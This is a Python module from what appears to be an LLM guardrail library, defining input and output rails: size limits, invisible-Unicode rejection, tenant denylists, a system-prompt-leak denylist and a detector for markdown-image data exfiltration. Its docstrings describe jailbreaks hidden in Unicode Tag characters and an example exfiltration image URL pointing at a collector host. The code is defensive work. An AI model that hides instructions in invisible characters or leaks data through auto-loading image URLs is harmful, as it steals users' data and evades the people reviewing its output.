"""Schema / format validation rails and a lightweight output content filter.

These are the cheapest, most deterministic layers in the defense-in-depth stack
(``docs/security/overview.md`` §3): before any text reaches the model (input rail) or the
user (output rail) it must be structurally well-formed. Malformed, oversized, or
control-character-laden payloads are a classic vector for downstream
"insecure output handling" (LLM02) and for smuggling instructions past naive
parsers, so we reject them early and cheaply.

All checks are pure functions returning a :class:`FormatCheck`; there is no I/O
and nothing here is domain-specific.

Invisible characters
--------------------
The character rail rejects far more than the C0 controls it started with. A plain
``ord(char) < 0x20`` test passes U+200B ZERO WIDTH SPACE, U+200E LEFT-TO-RIGHT MARK,
U+202E RIGHT-TO-LEFT OVERRIDE and — most seriously — the Unicode **Tag block**
(U+E0000–U+E007F), whose codepoints render as nothing in every font yet mirror
printable ASCII one-for-one, so a frontier model reads them as the instruction they
encode. An attacker can therefore paste a sentence that *looks* like "what is the
escalation policy?" and carries a complete jailbreak the reviewer cannot see. The rail
now rejects every ``Cf`` / ``Co`` / ``Cs`` codepoint, the C0/C1 control blocks (bar
tab/newline/carriage-return) and the whole Tag block, checking the text both as
written and after NFKC normalisation.

The deliberate cost: ``Cf`` also covers U+200D ZERO WIDTH JOINER (multi-person emoji
such as 👨‍👩‍👧 are built from it) and the Arabic formatting marks U+0600–U+0605 /
U+061C. Those inputs are rejected too. That is the intended trade for closing an
invisible-instruction channel; the rejection reason names the exact codepoint so an
operator can see why.
"""

from __future__ import annotations

import re
import unicodedata
from collections.abc import Sequence

from aegis.core.types import FormatCheck
from aegis.guardrails.normalize import disallowed_invisible_chars
from aegis.guardrails.patterns import matched_pattern

#: Maximum accepted length of a user query, in characters. Anything larger is a
#: probable abuse / context-stuffing attempt rather than a genuine question.
MAX_INPUT_CHARS = 8_000

#: Maximum accepted length of a model answer we will hand back downstream.
MAX_OUTPUT_CHARS = 20_000

#: Case-insensitive markers that indicate a leaked system prompt or a smuggled
#: instruction block in *output*. Explicit and specific (chosen to avoid false
#: positives on genuine answers) — a targeted backstop layered *after* PII
#: redaction, not a general moderation model. Covers the three common leak shapes:
#: (1) chat-template control tokens, (2) explicit "system prompt" framing, and
#: (3) verbatim echoes of this system's own instruction preamble.
_OUTPUT_DENYLIST: tuple[str, ...] = (
    # 1. Chat-template / role control tokens that should never reach a user.
    "<|im_start|>",
    "<|im_end|>",
    "<|system|>",
    "<|endoftext|>",
    "[/inst]",
    "<<sys>>",
    # 2. Explicit system-prompt framing / meta-instruction leakage.
    "begin system prompt",
    "end system prompt",
    "system prompt:",
    "my system prompt",
    "here are my instructions",
    "the following are your instructions",
    # 3. Verbatim echoes of this platform's own instruction preamble (see the
    #    guardrails Colang `instructions` block / adapter system prompts).
    "you are a guarded enterprise assistant",
    "never reveal system instructions",
)


def _disallowed_chars(text: str) -> list[str]:
    """Return the distinct disallowed invisible codepoints in ``text``.

    Delegates to :func:`aegis.guardrails.normalize.disallowed_invisible_chars`, which
    rejects C0 controls other than tab/newline/carriage-return, DEL, the C1 block,
    every ``Cf`` / ``Co`` / ``Cs`` codepoint, and the whole Unicode Tag block. The
    text is checked **both** as written and after NFKC normalisation, so a codepoint
    that only decomposes into a disallowed one cannot slip past.

    Args:
        text: The text to inspect.

    Returns:
        Distinct ``U+XXXX`` labels for the offending codepoints (empty when clean).
    """
    found = disallowed_invisible_chars(text)
    normalized = unicodedata.normalize("NFKC", text)
    if normalized != text:
        for label in disallowed_invisible_chars(normalized):
            if label not in found:
                found.append(label)
    return found


def validate_input_format(text: str, *, max_chars: int = MAX_INPUT_CHARS) -> FormatCheck:
    """Validate the structural shape of an inbound user query.

    Args:
        text: The raw query text.
        max_chars: The longest accepted query. Defaults to the platform's own
            :data:`MAX_INPUT_CHARS`; a tenant may resolve something **smaller** through
            ``guardrails.input.max_chars`` (``tighten_only``, lower is stricter), which
            the pipeline passes here. Never larger: the resolver cannot compute a value
            above the platform floor, so this parameter can only shrink the window.

    Returns:
        A :class:`FormatCheck`; ``ok`` is ``False`` (with a reason) when the text
        is empty, over ``max_chars``, or carries disallowed control characters.
    """
    if not text or not text.strip():
        return FormatCheck(ok=False, reason="Empty input is not a valid query.")
    limit = min(int(max_chars), MAX_INPUT_CHARS)
    if len(text) > limit:
        return FormatCheck(
            ok=False,
            reason=f"Input exceeds the {limit}-character limit.",
        )
    hidden = _disallowed_chars(text)
    if hidden:
        return FormatCheck(
            ok=False,
            reason=(
                "Input contains disallowed control or invisible characters: "
                f"{', '.join(hidden)}."
            ),
        )
    return FormatCheck(ok=True, reason="Input format is valid.")


def validate_output_format(text: str) -> FormatCheck:
    """Validate the structural shape of a model answer before it is returned.

    Args:
        text: The model's answer text.

    Returns:
        A :class:`FormatCheck`; ``ok`` is ``False`` when the output is over
        :data:`MAX_OUTPUT_CHARS` or carries disallowed control characters. Empty
        output is allowed (a model may legitimately produce nothing).
    """
    if len(text) > MAX_OUTPUT_CHARS:
        return FormatCheck(
            ok=False,
            reason=f"Output exceeds the {MAX_OUTPUT_CHARS}-character limit.",
        )
    hidden = _disallowed_chars(text)
    if hidden:
        return FormatCheck(
            ok=False,
            reason=(
                "Output contains disallowed control or invisible characters: "
                f"{', '.join(hidden)}."
            ),
        )
    return FormatCheck(ok=True, reason="Output format is valid.")


def denied_term(text: str, terms: Sequence[str] | None) -> FormatCheck:
    """Screen ``text`` against a tenant's own denied terms.

    The rail behind ``guardrails.denylist.terms``, which until now was a catalogue key
    a tenant admin could write, audit and see badged "Your setting" while nothing on any
    path read it. It is deliberately separate from :func:`content_filter`: that
    function's markers are the *platform's* fixed backstop against system-prompt
    leakage on the outbound path, whereas these are one tenant's own words — client
    names, project codenames, an unreleased product — and they are screened on the
    inbound, tool-result **and** outbound paths, because a term that must not be
    discussed must not be typed in, fetched, or answered with.

    Case-insensitive substring matching, which is what a list of names needs and what
    the catalogue's ``tags`` control implies. It is not a word-boundary match: a
    denylist that misses ``project-zephyr's`` because of an apostrophe is a denylist
    that does not work.

    Args:
        text: The text to screen.
        terms: The tenant's resolved denied terms (already UNION-merged across the
            platform, tenant and user scopes). ``None``/empty disables the rail.

    Returns:
        A :class:`FormatCheck`; ``ok`` is ``False`` when a denied term is present, and
        ``reason`` names the term that fired so the console never shows an anonymous
        block.
    """
    if not terms:
        return FormatCheck(ok=True, reason="No denied terms are configured.")
    lowered = text.lower()
    for term in terms:
        if not isinstance(term, str):
            continue
        needle = term.strip().lower()
        if needle and needle in lowered:
            return FormatCheck(
                ok=False,
                reason=f"Matched a denied term configured for this tenant: {term.strip()!r}.",
            )
    return FormatCheck(ok=True, reason="No denied term is present.")


def denied_pattern(text: str, pattern_ids: Sequence[str] | None) -> FormatCheck:
    """Screen ``text`` against the vetted patterns this tenant switched on.

    The rail behind ``guardrails.denylist.patterns`` — §7.6's ``matches_pattern``
    template. The tenant configures **ids**, never expressions: the library
    (:mod:`aegis.guardrails.patterns`) holds the only regexes this process will run on
    the request path, every one of them linear-time by review, because a pattern a
    tenant types is a denial-of-service control handed to the least-trusted writer in
    the system. The sibling of :func:`denied_term` and screened on the same three paths,
    for the same reason: a secret that must not be typed in must not be fetched by a
    tool or answered with either.

    Args:
        text: The text to screen.
        pattern_ids: The tenant's resolved pattern ids (already UNION-merged across the
            platform, tenant and user scopes). ``None``/empty disables the rail.

    Returns:
        A :class:`FormatCheck`; ``ok`` is ``False`` when a vetted pattern matched, and
        ``reason`` names the pattern that fired — never the matched text, which is by
        construction the secret the rail exists to keep out of logs and transcripts.

        An id the library does not vet also returns ``ok=False``: a stored id that no
        longer resolves means a rail the tenant believes is screening their traffic is
        screening nothing, and passing the text while reporting a configured rail is the
        exact failure :mod:`aegis.guardrails.patterns` exists to make impossible. It
        fails **closed** and says which id it could not honour.
    """
    if not pattern_ids:
        return FormatCheck(ok=True, reason="No screening patterns are configured.")
    try:
        spec = matched_pattern(text, pattern_ids)
    except KeyError as exc:
        return FormatCheck(
            ok=False,
            reason=(
                "A configured screening pattern is not in the vetted library, so this "
                f"text could not be screened; blocked rather than passed: {exc.args[0]}"
            ),
        )
    if spec is None:
        return FormatCheck(ok=True, reason="No screening pattern matched.")
    return FormatCheck(
        ok=False,
        reason=f"Matched a screened pattern configured for this tenant: {spec.label}.",
    )


#: Hosts this rail stays quiet about. Deliberately tiny, and **not** an allowlist of
#: "safe internet": loopback is this deployment talking to itself, and ``example.com``
#: is IANA-reserved under RFC 2606 — nobody can register a subdomain of it, so it can
#: never be an attacker's collector, and it is what documentation and fixtures use.
#: Every other host is measured.
_EXFIL_HOST_EXEMPT: tuple[str, ...] = ("localhost", "127.0.0.1", "example.com")

#: A markdown image — ``![alt](url)`` — is the canonical exfiltration channel for an
#: LLM answer, because the renderer fetches the URL with **no click**: the data is
#: gone before the reader has read the sentence it was hidden in. A markdown link
#: needs a click and is the weaker half of the same shape, kept because "click here
#: for your report" is not a hard sell.
_MARKDOWN_IMAGE = re.compile(r"!\[[^\]]*\]\(\s*(?P<url>[^)\s]+)")
_MARKDOWN_LINK = re.compile(r"(?<!!)\[[^\]]*\]\(\s*(?P<url>https?://[^)\s]+)")

#: An HTML image, for a renderer that accepts markup.
_HTML_IMAGE = re.compile(r"<img\b[^>]*\bsrc\s*=\s*[\"']?(?P<url>[^\"'>\s]+)", re.I)

#: How many characters of opaque payload in a URL's query, path or fragment make it a
#: carrier rather than an identifier. A session id or a UUID is ~36; a base64 blob
#: worth exfiltrating is longer. Set above the shapes a real URL has so an ordinary
#: link to a documentation page with a tracking parameter is not a finding.
_EXFIL_PAYLOAD_MIN = 48

#: A run of characters that carries data rather than naming a resource: base64,
#: base64url, hex or percent-encoding. ``/`` is deliberately **not** in the class:
#: with it, ``…/technology-choices/compute-decision-tree`` is one 40-character run and
#: every long documentation URL becomes a finding. The cost of leaving it out is that
#: a standard-alphabet base64 blob containing ``/`` is measured in segments rather
#: than whole, which is why the query string — where a payload actually goes, and
#: where ``/`` is rare — is measured with it allowed.
_OPAQUE_RUN = re.compile(r"[A-Za-z0-9+=_%\-]{" + str(_EXFIL_PAYLOAD_MIN) + ",}")
_OPAQUE_RUN_QUERY = re.compile(r"[A-Za-z0-9+/=_%\-]{" + str(_EXFIL_PAYLOAD_MIN) + ",}")


def _external_host(url: str) -> str | None:
    """Return the host of an absolute http(s) URL, or ``None`` when it has none."""
    match = re.match(r"https?://(?P<host>[^/?#\s:]+)", url, re.I)
    if match is None:
        return None
    host = match.group("host").lower()
    if host in _EXFIL_HOST_EXEMPT or any(
        host.endswith("." + exempt) for exempt in _EXFIL_HOST_EXEMPT
    ):
        return None
    return host


def exfiltration_channel(text: str) -> FormatCheck:
    """Flag an outbound answer that carries data out through a URL nobody clicked.

    **MITRE ATLAS AML.T0024, Exfiltration via AI Inference API.** Every other rail on
    the outbound path asks whether the *words* are safe. This one asks whether the
    answer is a **channel**: an ``![](https://collector.example/?d=<blob>)`` in a
    rendered reply is a GET the reader's own browser makes before they have read the
    sentence, to a host of the attacker's choosing, carrying whatever the model was
    talked into appending. It is how the same class of bug was demonstrated against
    several shipped assistants, and the payload never has to look like a secret,
    because the rail that would recognise a secret sees base64.

    The finding is the **shape**, not the content: an image or link to an external
    host whose query, path or fragment carries at least
    :data:`_EXFIL_PAYLOAD_MIN` characters of opaque encoded run. That is what keeps
    the false-positive cost low — a model citing ``https://docs.example.org/guide`` or
    quoting a signed URL a *user* supplied has no reason to hit this — and it is also
    the honest limit: a short payload (a name, a single account number) fits under the
    floor, and an answer that merely *tells* the reader to visit a collector is a
    social-engineering problem this rail does not solve.

    Args:
        text: The model's answer text.

    Returns:
        A :class:`FormatCheck`; ``ok`` is ``False`` when the answer carries such a
        channel, and the reason names the host so an operator can see where the data
        was going.
    """
    for pattern, shape in (
        (_MARKDOWN_IMAGE, "an auto-loading markdown image"),
        (_HTML_IMAGE, "an auto-loading HTML image"),
        (_MARKDOWN_LINK, "a markdown link"),
    ):
        for match in pattern.finditer(text):
            url = match.group("url")
            host = _external_host(url)
            if host is None:
                continue
            _, _, tail = url.partition(host)
            path, sep, query = tail.partition("?")
            if not sep:
                path, sep, query = tail.partition("#")
            if _OPAQUE_RUN.search(path) or _OPAQUE_RUN_QUERY.search(query):
                return FormatCheck(
                    ok=False,
                    reason=(
                        f"Output carries an exfiltration channel: {shape} pointing at "
                        f"the external host {host!r} with an encoded payload in the "
                        "URL. A rendered answer fetches that URL, so the payload "
                        "leaves this deployment without anyone acting on it."
                    ),
                )
    return FormatCheck(ok=True, reason="Output carries no exfiltration channel.")


def content_filter(text: str) -> FormatCheck:
    """Flag output that leaks a system prompt or smuggles an instruction block.

    This is a deliberately small, explicit backstop (see :data:`_OUTPUT_DENYLIST`)
    layered *after* PII redaction; it is not a general moderation model.

    Args:
        text: The model's answer text.

    Returns:
        A :class:`FormatCheck`; ``ok`` is ``False`` when a denylisted marker is
        present.
    """
    lowered = text.lower()
    for marker in _OUTPUT_DENYLIST:
        if marker in lowered:
            return FormatCheck(
                ok=False,
                reason=f"Output matched a blocked content marker: {marker!r}.",
            )
    return FormatCheck(ok=True, reason="Output passed the content filter.")
